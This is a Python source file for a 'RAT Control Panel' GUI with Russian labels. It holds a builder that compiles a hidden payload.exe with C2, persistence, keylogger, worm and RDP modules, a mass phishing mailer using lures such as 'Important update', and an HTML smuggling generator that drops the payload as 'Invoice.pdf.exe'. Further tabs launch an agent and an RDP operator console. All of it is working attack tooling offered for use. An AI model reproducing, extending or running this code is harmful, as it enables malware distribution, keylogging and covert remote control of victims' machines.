# language: Python, file: panel.py
import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib, shutil
import threading, importlib.util, re, smtplib
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.policy import default as email_policy

if getattr(sys, "frozen", False):
    RES = pathlib.Path(sys._MEIPASS)
    BASE = pathlib.Path(sys.executable).parent
else:
    RES = BASE = pathlib.Path(__file__).parent

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    from PyQt5 import QtWidgets
    HAS_QT = True
except ImportError:
    HAS_QT = False

# --- Сплэш-экран ---
class SplashScreen(tk.Toplevel):
    def __init__(self, master, icon_path):
        super().__init__(master)
        self.overrideredirect(True)
        self.geometry("400x300+500+300")
        self.configure(bg="#111111")
        try:
            img = tk.PhotoImage(file=icon_path)
            lbl_img = tk.Label(self, image=img, bg="#111111")
            lbl_img.image = img
            lbl_img.pack(expand=True)
        except Exception:
            tk.Label(self, text="[ICON]", fg="white", bg="#111111", font=("Arial", 20)).pack(expand=True)
        tk.Label(self, text="Loading...", fg="#00ffcc", bg="#111111", font=("Consolas", 12, "bold")).pack(pady=10)
        self.update()

# --- Основной код ---
CFG_PATH = BASE / "mail_config.json"
DEFAULT_CFG = {
    "smtp_host": "smtp.gmail.com", "smtp_port": 587,
    "smtp_user": "", "smtp_pass": "", "mail_to": "",
    "from_name": "Updater", "subject": "Important update",
    "body": "Please check the attached file.",
    "delay_sec": 10, "attach_file": "", "c2_host": "127.0.0.1", "c2_port": 5555
}

def _load_cfg():
    if CFG_PATH.exists():
        try:
            return {**DEFAULT_CFG, **json.loads(CFG_PATH.read_text(encoding="utf-8"))}
        except Exception:
            pass
    CFG_PATH.write_text(json.dumps(DEFAULT_CFG, ensure_ascii=False, indent=2), encoding="utf-8")
    return dict(DEFAULT_CFG)

def _save_cfg(cfg):
    CFG_PATH.write_text(json.dumps(cfg, ensure_ascii=False, indent=2), encoding="utf-8")

def _python_exe():
    if getattr(sys, "frozen", False):
        for c in ("python", "python3", "py"):
            p = shutil.which(c)
            if p: return p
        return None
    return sys.executable

class BuilderTab(ttk.Frame):
    def __init__(self, master, log_fn, on_cfg_saved):
        super().__init__(master, padding=10)
        self.log = log_fn
        self.on_cfg_saved = on_cfg_saved
        self.cfg = _load_cfg()
        self.vars = {}
        self.mods = {}
        self._ui()

    def _ui(self):
        self.columnconfigure(1, weight=1)
        fields = [
            ("c2_host",   "C2 host (IP оператора)", self.cfg.get("c2_host", "127.0.0.1")),
            ("c2_port",   "C2 port (RDP)", str(self.cfg.get("c2_port", 5555))),
        ]
        r = 0
        for k, label, default in fields:
            ttk.Label(self, text=label).grid(row=r, column=0, sticky="w", pady=3)
            v = tk.StringVar(value=default)
            ttk.Entry(self, textvariable=v).grid(row=r, column=1, sticky="ew", pady=3)
            self.vars[k] = v
            r += 1

        ttk.Button(self, text="Сохранить C2 в конфиг", command=self.save_cfg).grid(row=r, column=0, columnspan=2, sticky="ew", pady=(4, 8))
        r += 1

        self.var_safe = tk.BooleanVar(value=True)
        ttk.Checkbutton(self, text="SAFE_MODE (не ломает систему)", variable=self.var_safe).grid(row=r, column=0, columnspan=2, sticky="w", pady=4)
        r += 1

        mods = ttk.LabelFrame(self, text="Модули", padding=6)
        mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
        all_mods = ["persistence", "keylogger", "worm", "rdp"]
        for i, m in enumerate(all_mods):
            v = tk.BooleanVar(value=True)
            ttk.Checkbutton(mods, text=m, variable=v).grid(row=i // 3, column=i % 3, sticky="w")
            self.mods[m] = v
        r += 1

        ttk.Button(self, text="Собрать payload", command=self.build).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")

    def save_cfg(self):
        cfg = _load_cfg()
        for k in ("c2_host", "c2_port"):
            val = self.vars[k].get()
            if k == "c2_port":
                try: val = int(val)
                except ValueError: pass
            cfg[k] = val
        _save_cfg(cfg)
        self.on_cfg_saved(cfg)
        self.log("[cfg] C2 сохранен")

    def build(self):
        cfg = {k: v.get() for k, v in self.vars.items()}
        cfg["safe_mode"] = self.var_safe.get()
        cfg["modules"] = [k for k, v in self.mods.items() if v.get()]
        try:
            cfg["c2_port"] = int(cfg["c2_port"])
        except ValueError:
            messagebox.showerror("Ошибка", "Порт должен быть числом.")
            return
        if not cfg["c2_host"]:
            messagebox.showerror("Ошибка", "Заполни C2 host.")
            return

        py = _python_exe()
        if not py: return messagebox.showerror("Ошибка", "Python не найден.")

        work = pathlib.Path(tempfile.mkdtemp(prefix="ratbuild_"))
        src = work / "rat_build.py"
        src.write_text((RES / "rat_template.py").read_text(encoding="utf-8").replace("__CFG__", json.dumps(cfg, ensure_ascii=False)), encoding="utf-8")
        if (RES / "rdp_agent_lib.py").exists(): shutil.copy(RES / "rdp_agent_lib.py", work / "rdp_agent_lib.py")

        out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить payload"))
        if not out_dir: return

        self.log(f"[build] Старт сборки...")
        threading.Thread(target=self._compile, args=(src, work, out_dir, py), daemon=True).start()

    def _compile(self, src, work, out_dir, py):
        try:
            flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            cmd = [py, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "payload", "--distpath", str(out_dir), str(src)]
            subprocess.run(cmd, cwd=work, check=True, capture_output=True, creationflags=flags)
            self.log(f"[build] OK: {out_dir / 'payload.exe'}")
            self.after(0, messagebox.showinfo, "Готово", "Payload собран.")
        except subprocess.CalledProcessError as e:
            self.log(f"[build] FAIL: {(e.stderr or b'').decode(errors='ignore')[-300:]}")
        except Exception as e:
            self.log(f"[build] FAIL: {e}")

class MassMailTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log_external = log_fn
        self.cfg = _load_cfg()
        self._stop = threading.Event()
        self._ui()

    def _ui(self):
        self.columnconfigure(1, weight=1)
        ttk.Label(self, text="SMTP").grid(row=0, column=0, sticky="w")
        self.smtp_label = ttk.Label(self, text=f"{self.cfg['smtp_user'] or 'не настроено'}")
        self.smtp_label.grid(row=0, column=1, columnspan=2, sticky="w")

        ttk.Label(self, text="Получатели (по одному на строку)", font=("", 10, "bold")).grid(row=1, column=0, columnspan=3, sticky="w", pady=(10, 2))
        self.txt_to = tk.Text(self, height=5); self.txt_to.grid(row=2, column=0, columnspan=3, sticky="ew")

        ttk.Label(self, text="Тема").grid(row=3, column=0, sticky="w", pady=3)
        self.var_subj = tk.StringVar(value=self.cfg.get("subject", ""))
        ttk.Entry(self, textvariable=self.var_subj).grid(row=3, column=1, columnspan=2, sticky="ew")

        ttk.Label(self, text="Текст").grid(row=4, column=0, sticky="nw")
        self.txt_body = tk.Text(self, height=4); self.txt_body.insert("1.0", self.cfg.get("body", ""))
        self.txt_body.grid(row=4, column=0, columnspan=3, sticky="ew")

        gen_frame = ttk.LabelFrame(self, text="Генератор HTML-дроппера (HTML Smuggling)", padding=6)
        gen_frame.grid(row=5, column=0, columnspan=3, sticky="ew", pady=6)
        ttk.Label(gen_frame, text="Путь к payload.exe:").pack(side="left")
        self.var_payload = tk.StringVar()
        ttk.Entry(gen_frame, textvariable=self.var_payload, width=30).pack(side="left", padx=5)
        ttk.Button(gen_frame, text="...", width=3, command=lambda: self.var_payload.set(filedialog.askopenfilename(filetypes=[("EXE", "*.exe")]))).pack(side="left")
        ttk.Button(gen_frame, text="Создать .html", command=self.gen_html).pack(side="left", padx=5)

        ttk.Label(self, text="Вложение (любой файл)").grid(row=6, column=0, sticky="w", pady=3)
        self.var_att = tk.StringVar()
        ttk.Entry(self, textvariable=self.var_att).grid(row=6, column=1, sticky="ew")
        ttk.Button(self, text="...", width=3, command=lambda: self.var_att.set(filedialog.askopenfilename())).grid(row=6, column=2)

        btns = ttk.Frame(self); btns.grid(row=7, column=0, columnspan=3, sticky="ew", pady=8)
        self.btn_send = ttk.Button(btns, text="Начать рассылку", command=self.start); self.btn_send.pack(side="left", expand=True, fill="x", padx=2)
        self.btn_stop = ttk.Button(btns, text="Стоп", command=self.stop, state="disabled"); self.btn_stop.pack(side="left", expand=True, fill="x", padx=2)
        self.progress = ttk.Progressbar(self, mode="determinate"); self.progress.grid(row=8, column=0, columnspan=3, sticky="ew")
        self.txt_log = scrolledtext.ScrolledText(self, height=8, state="disabled"); self.txt_log.grid(row=9, column=0, columnspan=3, sticky="nsew")
        self.rowconfigure(9, weight=1)

    def gen_html(self):
        p = self.var_payload.get()
        if not os.path.isfile(p): return messagebox.showerror("Ошибка", "Payload не найден.")
        out = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
        if not out: return
        with open(p, "rb") as f: b64 = base64.b64encode(f.read()).decode()
        html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Document</title></head>
<body><h2>Loading document...</h2><script>
var data = atob("{b64}");
var arr = new Uint8Array(data.length);
for(var i=0;i<data.length;i++) arr[i]=data.charCodeAt(i);
var blob = new Blob([arr], {{type:"application/octet-stream"}});
var a = document.createElement("a");
a.href = URL.createObjectURL(blob); a.download = "Invoice.pdf.exe"; a.click();
</script></body></html>"""
        with open(out, "w", encoding="utf-8") as f: f.write(html)
        self.log(f"[smuggle] HTML создан: {out}")

    def _log(self, line):
        self.txt_log.configure(state="normal"); self.txt_log.insert("end", line + "\n"); self.txt_log.see("end"); self.txt_log.configure(state="disabled")
        self.log_external(line)

    def start(self):
        self.cfg = _load_cfg()
        self.smtp_label.configure(text=self.cfg["smtp_user"] or "не настроено")
        rcpts = re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", self.txt_to.get("1.0", "end"))
        if not rcpts: return messagebox.showerror("Ошибка", "Нет адресов.")
        att = self.var_att.get()
        self.btn_send.configure(state="disabled"); self.btn_stop.configure(state="normal")
        self.progress.configure(maximum=len(rcpts), value=0)
        threading.Thread(target=self._run, args=(rcpts, self.var_subj.get(), self.txt_body.get("1.0", "end"), att), daemon=True).start()

    def stop(self): self._stop.set()

    def _run(self, rcpts, subject, body, att):
        ok = fail = 0; att_data = None; att_name = None
        if att and os.path.isfile(att):
            att_name = os.path.basename(att); att_data = open(att, "rb").read()
        try:
            s = smtplib.SMTP(self.cfg["smtp_host"], int(self.cfg["smtp_port"]), timeout=30)
            s.ehlo(); s.starttls(); s.ehlo(); s.login(self.cfg["smtp_user"], self.cfg["smtp_pass"])
        except Exception as e:
            self.after(0, self._log, f"[!] SMTP FAIL: {e}"); self.after(0, self._done); return
        try:
            for i, r in enumerate(rcpts, 1):
                if self._stop.is_set(): break
                m = MIMEMultipart(policy=email_policy); m["From"] = self.cfg["smtp_user"]; m["To"] = r; m["Subject"] = subject
                m.attach(MIMEText(body, "plain", "utf-8"))
                if att_data:
                    p = MIMEApplication(att_data); p.add_header("Content-Disposition", "attachment", filename=att_name); m.attach(p)
                try:
                    s.send_message(m); ok += 1; self.after(0, self._log, f"[{i}] -> {r} OK")
                except (smtplib.SMTPException, OSError) as e:
                    fail += 1; self.after(0, self._log, f"[{i}] -> {r} FAIL: {e}")
                self.after(0, self.progress.configure, {"value": i})
                time.sleep(int(self.cfg.get("delay_sec", 10)))
        finally:
            try: s.quit()
            except: pass
            self.after(0, self._log, f"Итог: OK={ok}, FAIL={fail}")
            self.after(0, self._done)

    def _done(self): self.btn_send.configure(state="normal"); self.btn_stop.configure(state="disabled")

class AgentTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log = log_fn; self._proc = None; self.columnconfigure(1, weight=1)
        ttk.Label(self, text="Host").grid(row=0, column=0, sticky="w")
        self.var_host = tk.StringVar(value="127.0.0.1"); ttk.Entry(self, textvariable=self.var_host).grid(row=0, column=1, sticky="ew")
        ttk.Label(self, text="Port").grid(row=1, column=0, sticky="w")
        self.var_port = tk.StringVar(value="5555"); ttk.Entry(self, textvariable=self.var_port, width=10).grid(row=1, column=1, sticky="w")
        self.var_safe = tk.BooleanVar(value=True); ttk.Checkbutton(self, text="RAT_SAFE", variable=self.var_safe).grid(row=2, column=0, columnspan=2, sticky="w")
        ttk.Button(self, text="Запустить агент", command=self.start).grid(row=3, column=0, columnspan=2, pady=5)
        self.out = scrolledtext.ScrolledText(self, height=12, state="disabled"); self.out.grid(row=4, column=0, columnspan=2, sticky="nsew")
        self.rowconfigure(4, weight=1)

    def _log(self, s):
        self.out.configure(state="normal"); self.out.insert("end", s + "\n"); self.out.see("end"); self.out.configure(state="disabled"); self.log(s)

    def start(self):
        py = _python_exe(); agent = RES / "rdp_agent.py"
        if not py or not agent.exists():
            self._log(f"[agent] нет {agent}")
            return
        env = os.environ.copy(); env.update({"RAT_HOST": self.var_host.get(), "RAT_PORT": self.var_port.get(), "RAT_SAFE": "1" if self.var_safe.get() else "0"})
        self._proc = subprocess.Popen([py, str(agent)], env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
        threading.Thread(target=self._read, daemon=True).start()
        self._log("[agent] запущен")

    def _read(self):
        for line in self._proc.stdout:
            self.after(0, self._log, line.rstrip())
        self.after(0, lambda: self._log("[agent] завершён"))

class OperatorTab(ttk.Frame):
    def __init__(self, master, log_fn):
        super().__init__(master, padding=10)
        self.log = log_fn; self.thread = None
        ttk.Label(self, text="Запуск RDP-оператора в отдельном окне").pack()
        ttk.Button(self, text="Запустить оператор", command=self.launch).pack(pady=10)
        self.out = scrolledtext.ScrolledText(self, height=10, state="disabled"); self.out.pack(fill="both", expand=True)
    
    def _log(self, s):
        self.out.configure(state="normal"); self.out.insert("end", s + "\n"); self.out.see("end"); self.out.configure(state="disabled"); self.log(s)

    def launch(self):
        if not HAS_QT: return self._log("[!] PyQt5 не установлен")
        self.thread = threading.Thread(target=self._run, daemon=True); self.thread.start()

    def _run(self):
        try:
            app = QtWidgets.QApplication(sys.argv)
            spec = importlib.util.spec_from_file_location("rdp_operator", RES / "rdp_operator.py")
            mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
            w = mod.Operator(); w.show(); app.exec_()
        except Exception as e: self._log(f"[!] FAIL: {e}")

class Panel(tk.Tk):
    def __init__(self):
        super().__init__()
        self.withdraw() # Скрываем основное окно до конца сплэша
        self.title("RAT Control Panel"); self.geometry("1000x780")
        
        # Сплэш
        icon = RES / "app.ico"
        self.splash = SplashScreen(self, str(icon) if icon.exists() else "")
        self.after(1500, self._show_main)

        nb = ttk.Notebook(self); nb.pack(fill="both", expand=True, padx=8, pady=8)
        self.log_txt = scrolledtext.ScrolledText(self, height=5, state="disabled"); self.log_txt.pack(fill="x", padx=8, pady=(0, 8))
        self.tab_builder = BuilderTab(nb, self.log, lambda c: None); nb.add(self.tab_builder, text="Builder")
        self.tab_mail = MassMailTab(nb, self.log); nb.add(self.tab_mail, text="Рассылка")
        nb.add(AgentTab(nb, self.log), text="Agent"); nb.add(OperatorTab(nb, self.log), text="Operator")

    def _show_main(self):
        self.splash.destroy()
        self.deiconify()

    def log(self, line):
        self.log_txt.configure(state="normal"); self.log_txt.insert("end", f"{time.strftime('%H:%M:%S')} {line}\n"); self.log_txt.see("end"); self.log_txt.configure(state="disabled")

if __name__ == "__main__":
    Panel().mainloop()
